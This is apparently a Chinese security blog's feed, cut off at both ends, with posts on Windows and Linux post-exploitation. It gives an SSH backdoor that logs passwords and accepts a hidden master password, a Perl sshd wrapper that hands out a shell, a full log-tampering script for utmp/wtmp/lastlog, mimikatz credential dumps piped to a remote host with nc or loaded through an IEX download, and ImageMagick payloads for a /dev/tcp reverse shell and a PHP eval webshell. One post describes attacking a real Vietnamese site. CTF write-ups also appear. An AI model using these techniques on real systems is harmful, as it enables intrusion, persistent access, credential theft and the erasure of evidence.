&#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;allports.exposed&quot;,$_)) &quot;Port $_ is open!&quot; &#125; 2&gt;$null 获取防火墙规则获取防火墙规则1Get-NetFirewallRule -all demo: 获取防火墙的名称列表1Get-NetFirewallRule -all | Format-List -Property Name demo: 获取防火墙的视图界面1Get-NetFirewallRule -all | Out-GridView demo: 在线web客户端(wget)在window下缺少文件的传输工具，将文件移动到Windows环境中是一项比较困难的任务，没有netcat，wget，curl，ssh或者python，而在linux下相对来说要简单得多。 但是在PowerShell中，我们上面所有的功能都可以获得，甚至包括wget。，下面来看看。 WebClient1(New-Object System.Net.WebClient).DownloadFile(&quot;http://10.0.0.10/demo.exe&quot;,&quot;demo.exe&quot;) 上述命令在Powershell的所有版本中都是可用的，所以不知道Powershell版本的情况下，是最佳选择。 命令分解12(New-Object System.Net.WebClient) - 创建WebClient类的实例。WebClient对象具有像GUI Web客户端一样执行所需的所有功能。DownloadFile（“ - 在WebClient类中调用DownloadFile方法,此方法允许WebClient从远程服务器下载某些东西 Invoke-WebRequest类似于linux版本下的wget。在帮助信息上，都很详细的有使用方法。1wget &quot;http://10.0.0.10/demo1.exe&quot; -outfile &quot;demo1.exe&quot; 显示PowerShell的版本123Get-Host或$PSVersionTable.PSVersion netsh interfac在linux上进行端口转发是很容易的。但是在window下的话，除了使用上传的工具，就只有使用本身自带的。NetSH (Network Shell) 是windows系统本身提供的功能强大的网络配置命令行工具Netsh接口Portproxy命令.对于在 IPv4 和 IPv6 网络和应用程序之间充当代理的管理服务器 将配置了 IPv4 的计算机和应用程序消息发送到配置了 IPv6 的计算机和应用程序。1netsh interface portproxy add v4tov6 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=2000::1:215:5dff:fe01:247 命令分解1234567netsh - 用于操纵网络接口的命令行工具interface - 允许用户操作上下文的（TCP/ IPv4/6）portproxy - 在IPv4和IPv6网络和应用程序之间建立代理v4tov6 - 将接收的IPv4流量转换为IPv6listenaddress -监听地址connectport - 要连接的端connectaddress - 连接地址 将配置了 IPv4 的计算机和应用程序消息发送到其他配置了 IPv4 的计算机和应用程序。1netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.1.101 如果想要证明是否正确执行，那就只需要用nmap进行探测即可。 ipconfigwindow下的ipconfig命令提供了网络接口配置的详细信息使用netsh进行实现、1netsh interface ipv4 show addresses demo:netsh还提供了像ipc$一样的远程管理功能，当然两者是不一样的。1netsh -r 192.168.1.103 -u entsim\administrator -p password 如果成功连接，就能得到一个交互式的shell。更多的netsh命令参照netsh命令的用法Netsh接口Portproxy命令 wmic processWMIC扩展WMI（Windows Management Instrumentation，Windows管理工具） ，提供了从命令行接口和批命令脚本执行系统管理的支持。 获取正在运行的进程1wmic process list full demo: 将结果输出1wmic /output:wmic.html process list full /format:hform demo: 命令分解12/output:wmic.html - 将WMIC的输出打印到HTML文件/format：hform - 选项包括表，列表，csv，xml，htable和hform。hform以HTML格式打印WMIC输出. 启动的程序1wmic startup list brief 远程命令执行1wmic /node:10.0.0.1 /user:Administrator process call create &quot;cmd.exe /c calc.exe&quot; 在横向pentest中，可以使用wmic来利用网络凭证来执行远程命令。wmic命令类似于psexec。 参考：Pen Test Poster: “White Board”–（翻译）https://github.com/PowerShellMafia/PowerSploithttps://blogs.sans.org/pen-testing/files/2017/03/Board-Elements_fung-fu.pdfhttps://www.sans.org/reading-room/whitepapers/access/identifying-vulnerable-network-protocols-powershell-37722]]></content>
      <categories>
        <category>PowerShell</category>
      </categories>
      <tags>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[STR2-045的简单利用]]></title>
    <url>%2F2017%2F04%2FSTR2-045%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[str2-045已经过去一段时间了，现在修复得也差不多了，就将之前做的一些东西简单记录一下。原理什么的就不解释了 WebShell找了个vn站点进行测试。tomcat这种中间组件大都是root权限运行，但是也有少数限制了权限。 当然，去看了看，已经发现有前辈在前面开路了。 然后就是上传脚本进行巩固权限。当然也可以直接转发出来开搞。12uname -a Linux ubuntu 3.19.0-26-generic #28~14.04.1-Ubuntu SMP Wed Aug 12 14:09:17 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 因为已经不需要提权了，所以看看有什么收获。弄着弄着网络就出问题了。 SSH后门123[/home/sysadmin/]$ ssh -VOpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8, OpenSSL 1.0.1f 6 Jan 2014 先记录好原来ssh的版本信息，在后面有用 然后进行常规的ssh后门的安装12345678910111213141516171819http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gzhttp://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gztar zxvf openssh-5.9p1.tar.gz tar zxvf 0x06-openssh-5.9p1.patch.tar.gz cd openssh-5.9p1.patch/ cp sshbd5.9p1.diff ../openssh-5.9p1 cd ../openssh-5.9p1 patch &lt; sshbd5.9p1.diff //patch 后门执行vi includes.h+#define ILOG &quot;/tmp/ilog&quot; //记录登录到本机的用户名和密码+#define OLOG &quot;/tmp/olog&quot; //记录本机登录到远程的用户名和密码+#define SECRETPW &quot;123456654321&quot; //你后门的密码执行vi version.h#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;#define SSH_PORTABLE &quot;小版本号&quot;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 到了这里出现1注意要是出现:configure: error: *** zlib.h missing – please install first or check config.log 这是没有提前装好环境的原因使用命令：12sudo apt-get install zlib1gsudo apt-get install zlib1g.dev 如果提示E: 无法获得锁 /var/lib/apt/lists/lock - open 那就是因为apt-get程序被占用了。使用sudo killall apt-get，杀掉进程再进行安装。如果提示1configure: error: *** OpenSSL headers missing - please install first or check config.log *** 那就执行apt-get install libssl-dev 如果提示configure: error: PAM headers not found那就执行apt-get install libpam0g-dev 但是在装依赖的时候出现问题，无法解决。 没装有PAM。当然也可以快速获取一个ssh后门，但是缺点也很明显。1ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888 然后就没继续了。。。。。（尴尬）]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux后门]]></title>
    <url>%2F2017%2F04%2FLinux%E5%B0%8F%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[记录之前所写的东西，这篇找不到原来的发布时间了。 PAM后门需要编译环境 概述：PAM （Pluggable AuthenticationModules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX9.0等。 openssh后门进入主机后，先执行：1unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace SSH留后门简单来说就是以下的代码：12345678910111213141516171819202122yum install -y openssl openssl-devel pam-develhttp://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gzhttp://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gztar zxvf openssh-5.9p1.tar.gz tar zxvf 0x06-openssh-5.9p1.patch.tar.gz cd openssh-5.9p1.patch/ cp sshbd5.9p1.diff ../openssh-5.9p1 cd ../openssh-5.9p1 patch &lt; sshbd5.9p1.diff //patch 后门执行vi includes.h+#define ILOG &quot;/tmp/ilog&quot; //记录登录到本机的用户名和密码+#define OLOG &quot;/tmp/olog&quot; //记录本机登录到远程的用户名和密码+#define SECRETPW &quot;123456654321&quot; //你后门的密码执行vi version.h#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;#define SSH_PORTABLE &quot;小版本号&quot;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5make &amp;&amp; make install service sshd restart //重启sshd 注意不同的ubuntu系统对应的安装命令会不一样，而且安装包名也会不一样。 清除痕迹接下来删除登录的历史记录，使用logtamper.py代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#!/usr/bin/env python# -*- coding:utf-8 -*-# mail: cn.b4dboy@gmail.com import os, struct, sysfrom pwd import getpwnamfrom time import strptime, mktimefrom optparse import OptionParser UTMPFILE = "/var/run/utmp"WTMPFILE = "/var/log/wtmp"LASTLOGFILE = "/var/log/lastlog" LAST_STRUCT = 'I32s256s'LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT) XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT) def getXtmp(filename, username, hostname): xtmp = '' try: fp = open(filename, 'rb') while True: bytes = fp.read(XTMP_STRUCT_SIZE) if not bytes: break data = struct.unpack(XTMP_STRUCT, bytes) record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in data] if (record[4] == username and record[5] == hostname): continue xtmp += bytes except: showMessage('Cannot open file: %s' % filename) finally: fp.close() return xtmp def modifyLast(filename, username, hostname, ttyname, strtime): try: p = getpwnam(username) except: showMessage('No such user.') timestamp = 0 try: str2time = strptime(strtime, '%Y:%m:%d:%H:%M:%S') timestamp = int(mktime(str2time)) except: showMessage('Time format err.') data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname) try: fp = open(filename, 'wb') fp.seek(LAST_STRUCT_SIZE * p.pw_uid) fp.write(data) except: showMessage('Cannot open file: %s' % filename) finally: fp.close() return True def showMessage(msg): print msg exit(-1) def saveFile(filename, contents): try: fp = open(filename, 'w+b') fp.write(contents) except IOError as e: showMessage(e) finally: fp.close() if __name__ == '__main__': usage = 'usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188\n \ logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12' parser = OptionParser(usage=usage) parser.add_option('-m', '--mode', dest='MODE', default='1' , help='1: utmp, 2: wtmp, 3: lastlog [default: 1]') parser.add_option('-t', '--ttyname', dest='TTYNAME') parser.add_option('-f', '--filename', dest='FILENAME') parser.add_option('-u', '--username', dest='USERNAME') parser.add_option('-i', '--hostname', dest='HOSTNAME') parser.add_option('-d', '--dateline', dest='DATELINE') (options, args) = parser.parse_args() if len(args) &lt; 3: if options.MODE == '1': if options.USERNAME == None or options.HOSTNAME == None: showMessage('+[Warning]: Incorrect parameter.\n') if options.FILENAME == None: options.FILENAME = UTMPFILE # tamper newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME) saveFile(options.FILENAME, newData) elif options.MODE == '2': if options.USERNAME == None or options.HOSTNAME == None: showMessage('+[Warning]: Incorrect parameter.\n') if options.FILENAME == None: options.FILENAME = WTMPFILE # tamper newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME) saveFile(options.FILENAME, newData) elif options.MODE == '3': if options.USERNAME == None or options.HOSTNAME == None or options.TTYNAME == None or options.DATELINE == None: showMessage('+[Warning]: Incorrect parameter.\n') if options.FILENAME == None: options.FILENAME = LASTLOGFILE # tamper modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE) else: parser.print_help() 隐身登陆隐藏的远程登录(w 看不到)12ssh -T user @ host /bin/bash -i 或 隐藏的远程登录(w 看不到)12ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -if SSH wrapper后门概述init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 目标端1234567cd /usr/sbinmv sshd ../binecho &apos;#!/usr/bin/perl&apos; &gt;sshdecho &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshdecho &apos;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshdchmod u+x sshd/etc/init.d/sshd restart 控制端1socat STDIOTCP4:target_ip:22,sourceport=19526 rootkitMafixMafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-弱类型解题]]></title>
    <url>%2F2017%2F03%2FPHP-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%A2%98%2F</url>
    <content type="text"><![CDATA[这是ZCTF线下关于php弱类型的题目先po一下代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php$l01o=0;$o1l0=0;$o10l=0;$lo10=0;if (isset($_GET[&apos;vhghf&apos;]))&#123; $vhghf = $_GET[&apos;vhghf&apos;]; $vhghf==&quot;1&quot;?die(&quot;ha?&quot;):NULL; switch ($vhghf) &#123; case 0: case 1: $l01o=1; break; &#125;&#125;$dfgdf=(array)json_decode(@$_GET[&apos;dfgdf&apos;]);if(is_array($dfgdf))&#123; is_numeric(@$dfgdf[&quot;gvnghdjk&quot;])?die(&quot;ha?&quot;):NULL; if(@$dfgdf[&quot;gvnghdjk&quot;])&#123; ($dfgdf[&quot;gvnghdjk&quot;]&gt;2017)?$o1l0=1:NULL; &#125; if(is_array(@$dfgdf[&quot;uxcndffznb&quot;]))&#123; if(count($dfgdf[&quot;uxcndffznb&quot;])!==2 OR !is_array($dfgdf[&quot;uxcndffznb&quot;][0])) die(&quot;ha?&quot;); $kghdhfghdfgbcvhgffg = array_search(&quot;ZCTF&quot;, $dfgdf[&quot;uxcndffznb&quot;]); $kghdhfghdfgbcvhgffg===false?die(&quot;ha?&quot;):NULL; foreach($dfgdf[&quot;uxcndffznb&quot;] as $key=&gt;$val)&#123; $val===&quot;ZCTF&quot;?die(&quot;ha?&quot;):NULL; &#125; $o10l=1;&#125;&#125;$cdggjydcnfsdyjaq = $_GET[&apos;cdggjydcnfsdyjaq&apos;];if ($cdggjydcnfsdyjaq != &apos;15562&apos;) &#123; if (strstr($cdggjydcnfsdyjaq, &apos;2017ZCTF&apos;)) &#123; if (substr(md5($cdggjydcnfsdyjaq),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123; $lo10=1; &#125; &#125;&#125;if($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)&#123; include &quot;flag.php&quot;; echo $flag;&#125;?&gt; 目的从大体上看得出，是要求($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)都符合要求了就出flag，而具体看就是要求这四个值都为1 以下是一段一段代码来进行分析 l01o123456789101112if (isset($_GET[&apos;vhghf&apos;]))&#123; $vhghf = $_GET[&apos;vhghf&apos;]; $vhghf==&quot;1&quot;?die(&quot;ha?&quot;):NULL; switch ($vhghf) &#123; case 0: case 1: $l01o=1; break; &#125;&#125; 经过测试，将vhghf与1进行比较，而且是双等号，直接1+任意字母绕过（手工fuzz，除了1#不能出结果之外,哪位知道的告知一声）。 o1l0+o10l而第二和第三个，因为是数组关系，就放一起讲dfgdf[&quot;gvnghdjk&quot;]&gt;2017与第一个相似，用大于2017的数值加任意字母绕过。下面是官方手册对array_search的介绍1mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) $needle，$haystack必需，$strict可选 函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤12345&lt;?php$a=array(0,1);var_dump(array_search("admin",$a)); // int(0) =&gt; 返回键值0var_dump(array_seach("1admin",$a)); // int(1) ==&gt;返回键值1?&gt; array_search函数 类似于== 也就是$a==”admin” 当然是$a=0 当然如果第三个参数为true则就不能绕过数字0双等于所有的无数字开头的字符串，可以用0去绕过array_search的比较。 lo10= $_GET['cdggjydcnfsdyjaq'];link12345678if ($cdggjydcnfsdyjaq != &apos;15562&apos;) &#123; if (strstr($cdggjydcnfsdyjaq, &apos;2017ZCTF&apos;)) &#123; if (substr(md5($cdggjydcnfsdyjaq),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123; echo &quot;4&quot;.&quot;&lt;br&gt;&quot;; $lo10=1; &#125; &#125;&#125; 最后一部分，规则已经制定好，$cdggjydcnfsdyjaq != &#39;15562&#39; 下来看到1(substr(md5($cdggjydcnfsdyjaq),8,16) == substr(md5(&apos;15562&apos;),8,16)) 线上赛的时候已经有过md5碰撞最后的payload： ?vhghf=1w&amp;dfgdf={“gvnghdjk”:”2018w”,”uxcndffznb”:[[“ZCTF”],0]}&amp;cdggjydcnfsdyjaq=x2017ZCTF24834]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mimikatz使用技巧]]></title>
    <url>%2F2017%2F03%2Fmimikatz%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[mimikatz平时一般使用技巧 非交换式打印（输出）mimikatz执行过程的log1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir 读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt nc到vps非交互抓明文,不留任何文件,直接把抓取结果用nc发到指定的远程机器(一般是自己的vps)上,可能有些端口出不来,换几个常用的即可,80,8080,443,53……12mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc -vv 192.168.3.251 1234 在目标机器上执行nc -lvp 1234 本地(vps上)机器执行 两种免杀方式使用powershell1powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot; Tips：powershell 默认windows visa后才有。也可以将结果发送到vps上。 procdump lsass 进程导出12C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits 本地使用mimikatz还原123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full 获取vpn密码1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit 浏览器密码12mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exitmimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit //读chrome密码]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-3714]]></title>
    <url>%2F2017%2F03%2FCVE-2016-3714%2F</url>
    <content type="text"><![CDATA[ImageMagick命令执行分析。 有只傻仔说复现不了ImageMagick，气死爹。 漏洞原理mageMagick在处理https的图片时，底层都会调用c语言的system函数（可能除了java版本的ImageMagick）执行一条命令。 1&lt;delegate decode=&quot;https&quot; command=&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;/&gt; 而其中的%o和%M定义如下:12%o output image filename%m input image format %o输出符%m被定义为输入的图片格式,也就是我们输入的url地址总体说：command这个本意是用来远程下载图片到本地，比如1&quot;curl&quot; -s -k -o &quot;demo.png&quot; &quot;https://rcoil.github.io/img/avatar.png&quot; 而因为只是做了简单的字符串拼接，但是没有做任何的过滤，所以我们修改command中的URL，拼接一些命令。 在本机进行了测试： 原理就是这样。 搭建环境用docker很方便的，因为早就有环境了。123456获取镜像docker pull medicean/vulapps:i_imagemagick_1运行镜像docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1进入交互式shelldocker run -t -i medicean/vulapps:i_imagemagick_1 &quot;/bin/bash&quot; 这个漏洞镜像中已经准备好了一切东西。 漏洞利用查看已经上传好的图片内容：docker exec i_imagemagick_1 cat /poc.png 具体内容如下：1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;|id; &quot;)&apos;pop graphic-context 1、push和pop是用于堆栈的操作，一个进栈，一个出栈;2、viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;3、fill url()是把图片填充到当前元素内; 在其中我们使用了fill url()的形式调用存在漏洞的https delegate,当ImageMagick去处理这个文件时,漏洞就会被触发。 本地docker测试1docker exec i_imagemagick_1 convert /poc.png 1.png 这已经成功利用了这个漏洞。 而在实战当中，把要上传图片的内容改成反弹shell的命令或者写webshell 反弹：1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|bash -i &gt;&amp; /dev/tcp/外网服务器ip/12340 0&gt;&amp;1&quot;)&apos;pop graphic-context 写webshell：1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/1.jpg&quot;|echo \\&apos;&lt;?php eval($_POST[\\&apos;2333\\&apos;]);?&gt;\\&apos; &gt; shell.php&quot;)&apos;pop graphic-context 比如： 映客直播APP存在命令执行（多台服务器）]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网必修-hash传递-ipc$]]></title>
    <url>%2F2017%2F03%2F%E5%86%85%E7%BD%91%E5%BF%85%E4%BF%AE-hash%E4%BC%A0%E9%80%92-ipc%24%2F</url>
    <content type="text"><![CDATA[这些是刚接触内网的时候了解到的，之前的blog也是写有的。 hsah传递详细原理就看这里：刨根问底：Hash传递攻击原理探究 测试环境：（本机） 目标机:Windows 7 Ultimate 192.168.1.106 攻击机:Linux 4.6.0-kali1-amd64 192.168.1.107 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107msf exploit(psexec) &gt; set LPORT 1024LPORT =&gt; 1024msf exploit(psexec) &gt; show optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate asPayload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.1.107 yes The listen address LPORT 1024 yes The listen portExploit target: Id Name -- ---- 0 Automaticmsf exploit(psexec) &gt; set RHOST 192.168.1.106RHOST =&gt; 192.168.1.106msf exploit(psexec) &gt; set smbuser rcoilsmbuser =&gt; rcoilmsf exploit(psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4msf exploit(psexec) &gt; exploit [*] Started reverse TCP handler on 192.168.1.107:1024 [*] 192.168.1.106:445 - Connecting to the server...[*] 192.168.1.106:445 - Authenticating to 192.168.1.106:445 as user &apos;rcoil&apos;...[*] 192.168.1.106:445 - Selecting PowerShell target[*] 192.168.1.106:445 - Executing the payload...[+] 192.168.1.106:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (957487 bytes) to 192.168.1.106[*] Meterpreter session 1 opened (192.168.1.107:1024 -&gt; 192.168.1.106:50209) at 2017-03-02 06:20:15 +0800meterpreter &gt; shellProcess 3460 created.Channel 1 created.Microsoft Windows [�汾 6.1.7600]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Windows\system32&gt;whoami whoamint authority\system ipc$内网渗透里面不管域还是工作组最先需要介绍的就是ipc连接，这个是内网渗透必修科目，后面绝大多数操作都要基于ipc连接。 ipc$的作用利用IPC$,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。dir、copy、xcopy、move、type等参数都可以使用UNC路径(何为UNC路径？简单来讲以\开头的路径就是UNC路径)。 计划任务说到ipc$，最多的就会提到at和schtasks12345678910111213141516171819202122232425262728C:\Users\John\Desktop&gt;md \\192.168.1.67\c$\users\public\base\C:\Users\John\Desktop&gt;copy base.exe \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;copy bat.bat \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;dir \\192.168.1.67\c$\users\public\base\ Volume in drive \\192.168.1.67\c$ is Windows 7 Volume Serial Number is 44F3-57F8 Directory of \\192.168.1.67\c$\users\public\base08/30/2017 02:35 AM &lt;DIR&gt; .08/30/2017 02:35 AM &lt;DIR&gt; ..08/11/2013 12:40 AM 43,520 base.exe08/30/2017 02:32 AM 32 bat.bat 2 File(s) 43,552 bytes 2 Dir(s) 55,193,870,336 bytes freeC:\Users\John\Desktop&gt;at \\192.168.1.67 4:40 c:\users\public\base\bat.batdded a new job with job ID = 1...删除at任务at /delete /y schtasks是at的升级版。123schtasks /create /tn &quot;base&quot; /tr c:\users\public\base\base.bat /sc once /st 4:50 /S 192.168.1.67 /RU System /u admin /p &quot;1&quot;schtasks /run /tn &quot;base&quot; /S 192.168.1.67 /u admin /p &quot;1&quot; /i #立即执行schtasks /F /delete /tn &quot;base&quot; /S 192.168.1.67 /u admin /p &quot;1&quot; /create表示创建计划任务，/tn表示任务名，/tr指定运行的文件，/sc是任务运行频率，/st是执行时间，/s指定远程机器名或ip地址，/ru指定运行任务的用户权限，这里指定为最高的SYSTEM，/i表示立即运行，/F表示如果指定的任务已经存在，则强制创建任务并抑制警告，/delete是删除任务。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NJCTF 2017]]></title>
    <url>%2F2017%2F03%2FNJCTF-2017%2F</url>
    <content type="text"><![CDATA[周末去玩了NJCTF 2017，感觉很不好，要吐血。 web题1、web100 Login 这道题有点像2016年北理的iscc最后一道题用到的是MySQL的超长截断，所以在注册的时候超长重置了admin的密码。密码要求有大小写，数字，特殊字符，必须有三种以上。进去之后get your flag就可以拿到flag12we search the database, and you are admin .welcome, admin. your flag is NJCTF&#123;4R3_Y0u_7H3_Re41_aDM1N?&#125; 2、web100 Get Flag这道题是求助了小伙伴xnianq，因为我没看题，有个傻仔就问我了。命令执行，随便执行个命令，就图片地址就可看到已经执行cat命令了，那就一直ls找到flag图片地址，再读就可以了。 3、web350 Text wall 这道题我找不到源码，是楼上那傻仔找到告诉我的。是通过备份文件.index.php.swo拿到部分源码如下：PHP12345678910&lt;?php$lists = [];Class filelist&#123; public function __toString() &#123; return highlight_file(&apos;hiehiehie.txt&apos;, true).highlight_file($this-&gt;source, true); &#125;&#125;//.....?&gt; 看着头疼，根据__toString的触发条件构造如下：123456789101112131415&lt;?phpClass filelist&#123; public function __toString() &#123; return highlight_file(&apos;hiehiehie.txt&apos;, true).highlight_file($this-&gt;source, true); &#125;&#125;$a = new filelist();$b= new filelist();$b-&gt;source = &apos;文件路径&apos;;$a-&gt;source=$b;$d=serialize($a);$e=sha1($d).$d;echo urlencode($e).&quot;&lt;br&gt;&quot;;?&gt; 可以读文件内容，读了index.php，从内容中知道flag的位置。再构造。123$f = new filelist();$f-&gt;source=&quot;/var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g&quot;;var_dump(serialize([$f])); 拿到命令就行1Cookie: lists=579574889b2cc082443598ee85d9a4839698a948a%3A1%3A%7Bi%3A0%3BO%3A8%3A%22filelist%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A46%3A%22%2fvar%2fwww%2fPnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g%22%3B%7D%7D 4、web300 Wallet 在爬路径的时候找到/www.zip拿到一个加密的压缩包，发现需要密码，猜到密码是njctf2017。解开是乱码，猜想是加密了，查质料发现是phpjm混淆加密，拿到加密之后的源代码，解密之后源码如下：12345678910111213141516171819202122232425262728293031323334&lt;?phprequire_once(&quot;db.php&quot;);$auth = 0;if (isset($_COOKIE[&quot;auth&quot;])) &#123; $auth = $_COOKIE[&quot;auth&quot;]; $hsh = $_COOKIE[&quot;hsh&quot;]; if ($auth == $hsh) &#123; $auth = 0; &#125; else if (sha1((string)$hsh) == md5((string)$auth)) &#123; $auth = 1; &#125; else &#123; $auth = 0; &#125;&#125; else &#123; $auth = 0; $s = $auth; setcookie(&quot;auth&quot;, $s); setcookie(&quot;hsh&quot;, sha1((string)$s));&#125;if ($auth) &#123; if 